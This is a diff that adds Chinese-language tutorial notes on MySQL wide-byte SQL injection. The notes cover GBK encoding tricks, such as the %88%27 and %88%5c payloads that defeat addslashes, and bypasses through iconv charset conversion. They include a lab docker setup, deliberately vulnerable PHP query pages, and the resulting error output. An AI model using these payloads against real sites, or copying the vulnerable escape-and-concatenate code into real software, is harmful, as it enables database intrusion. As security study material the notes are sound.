@@ -21,6 +21,9 @@
   - [文件读写](#文件读写)
   - [dnslog外带数据](#dnslog外带数据)
   - [宽字节注入](#宽字节注入)
+    - [GBK编码注入](#gbk编码注入)
+    - [iconv](#iconv)
+    - [latin1编码注入](#latin1编码注入)
   - [约束攻击](#约束攻击)
   - [无列名注入](#无列名注入)
   - [insert update delete注入](#insert-update-delete注入)
@@ -1548,9 +1551,234 @@ Time: 22.297s
 
 ### 宽字节注入
 
+#### GBK编码注入
 
+php编码为`UTF-8`而mysql编码为`gbk`,在php向mysql传递数据时会产生编码转换从而导致注入
 
+通过`set names 'gbk';`将mysql编码设置成`gbk`
 
+```
+version: '3.8'
+services:
+  mysql44:
+    image: mysql:5.5.44
+    container_name: mysql-44
+    ports:
+      - "4400:3306"
+    environment:
+      MYSQL_ROOT_PASSWORD: root
+    command: --character-set-server=gbk --collation-server=gbk_bin
+```
+
+```
+sql_injection_test> show variables like '%char%'
++--------------------------+----------------------------------+
+| Variable_name            | Value                            |
++--------------------------+----------------------------------+
+| character_set_client     | utf8                             |
+| character_set_connection | utf8                             |
+| character_set_database   | gbk                              |
+| character_set_filesystem | binary                           |
+| character_set_results    | utf8                             |
+| character_set_server     | gbk                              |
+| character_set_system     | utf8                             |
+| character_sets_dir       | /usr/local/mysql/share/charsets/ |
++--------------------------+----------------------------------+
+8 rows in set
+Time: 0.008s
+sql_injection_test> set names 'gbk';
+Query OK, 0 rows affected
+Time: 0.001s
+sql_injection_test> show variables like '%char%'
++--------------------------+----------------------------------+
+| Variable_name            | Value                            |
++--------------------------+----------------------------------+
+| character_set_client     | gbk                              |
+| character_set_connection | gbk                              |
+| character_set_database   | gbk                              |
+| character_set_filesystem | binary                           |
+| character_set_results    | gbk                              |
+| character_set_server     | gbk                              |
+| character_set_system     | utf8                             |
+| character_sets_dir       | /usr/local/mysql/share/charsets/ |
++--------------------------+----------------------------------+
+8 rows in set
+Time: 0.009s
+```
+
+```
+' -> 0x27
+\ -> 0x5c
+```
+
+`addslashes`将`'`转义为`\'`,假设此时传入一个`\u8827`的utf8字符其URL编码为`%88%27`,那么经过`addslashes`后得到`%88%5c%27`
+
+此时mysql以gbk进行编码,`%88%5c`被理解成`圽`这个汉字,而`%27`即`'`成功逃逸
+
+>示例
+
+```
+sql_injection_test> select * from `user`;
++----+----------+----------+
+| id | username | password |
++----+----------+----------+
+| 1  | admin    | admin123 |
+| 2  | test     | test     |
++----+----------+----------+
+2 rows in set
+Time: 0.008s
+```
+
+```php
+<?php
+highlight_file(__FILE__);
+$db = new mysqli("192.168.92.128", "root", "root", "sql_injection_test", "4400");
+if (mysqli_connect_errno()) { #检查连接
+    printf("Connect failed: %s\n", mysqli_connect_error());
+    exit();
+}
+if (empty($_GET['username'])) {
+    exit();
+}
+$username = addslashes($_GET['username']);
+var_dump($username);
+$query = "select * from user where username = '$username';";
+$result = $db->query($query);
+var_dump($result->fetch_all());
+```
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031342232.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031342995.png)
+
+`'error' => string 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''�\''' at line 1' (length=151)`
+
+可以看到`'`成功逃逸,引起了mysql的报错
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031343300.png)
+
+还有另一种思路即将`\'`转换成`\\'`,造成缺少`'`语句无法正常闭合
+
+我们传入`%88%5c`,经过`addslashes`后转换成`%88%5c%5c`,即`username='%88\\'
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031350182.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031351361.png)
+
+`'error' => string 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''�\\'' at line 1' (length=151)`
+
+可以看到缺少`'`导致语句无法闭合,引起了mysql的报错
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031352322.png)
+
+#### iconv
+
+在使用`iconv`进行编码转换时会产生注入
+
+`iconv(string $in_charset, string $out_charset, string $str): string`
+
+将字符串`str`从`in_charset`转换编码到`out_charset`
+
+1. `UTF-8`转`GBK`
+
+```php
+<?php
+highlight_file(__FILE__);
+$db = new mysqli("192.168.92.128", "root", "root", "sql_injection_test", "4400");
+if (mysqli_connect_errno()) { #检查连接
+    printf("Connect failed: %s\n", mysqli_connect_error());
+    exit();
+}
+if (empty($_GET['username'])) {
+    exit();
+}
+$username = $_GET['username'];
+var_dump(urlencode($username));
+$username = iconv('UTF-8', 'GBK', $username);
+$username = addslashes($username);
+var_dump(urlencode($username));
+var_dump($username);
+$query = "select * from user where username = '$username';";
+$result = $db->query($query);
+var_dump($result->fetch_all());
+```
+
+传入`錦`即`%e9%8c%a6`,在`UTF-8`转换为`GBK`后得到`%E5%5C`,造成了注入
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031427016.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031427066.png)
+
+2. `GBK`转`UTF-8`
+
+```
+version: '3.8'
+services:
+  mysql44:
+    image: mysql:5.5.44
+    container_name: mysql-44
+    ports:
+      - "4400:3306"
+    environment:
+      MYSQL_ROOT_PASSWORD: root
+    command: --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci
+```
+
+```
+sql_injection_test> show variables like '%char%'
++--------------------------+----------------------------------+
+| Variable_name            | Value                            |
++--------------------------+----------------------------------+
+| character_set_client     | utf8                             |
+| character_set_connection | utf8                             |
+| character_set_database   | utf8                             |
+| character_set_filesystem | binary                           |
+| character_set_results    | utf8                             |
+| character_set_server     | utf8mb4                          |
+| character_set_system     | utf8                             |
+| character_sets_dir       | /usr/local/mysql/share/charsets/ |
++--------------------------+----------------------------------+
+8 rows in set
+Time: 0.008s
+```
+
+```php
+<?php
+highlight_file(__FILE__);
+$db = new mysqli("192.168.92.128", "root", "root", "sql_injection_test", "4400");
+if (mysqli_connect_errno()) { #检查连接
+    printf("Connect failed: %s\n", mysqli_connect_error());
+    exit();
+}
+if (empty($_GET['username'])) {
+    exit();
+}
+$username = $_GET['username'];
+var_dump(urlencode($username));
+$username = addslashes($username);#注意这里addslashes提前了
+$username = iconv('GBK', 'UTF-8', $username);
+var_dump(urlencode($username));
+var_dump($username);
+$query = "select * from user where username = '$username';";
+$result = $db->query($query);
+var_dump($result->fetch_all());
+```
+
+传入`%e5%5c'`即`錦`的GBK编码加上一个`'`,经过`addslashes`得到`%e5%5c%5c`,经过`iconv`得到`%E9%8C%A6%5C%5C%27`,`%E9%8C%A6`被作为一个`UTF-8`字符即`錦`,而`%5C%5C%27`即`\\'`成功逃逸出`'`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031440631.png)
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031440120.png)
+
+`'error' => string 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''錦\\''' at line 1' (length=154)`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202202031441844.png)
+
+#### latin1编码注入
+
+[Mysql字符编码利用技巧](https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html)
+
+>todo tofinish
 
 ### 约束攻击
 
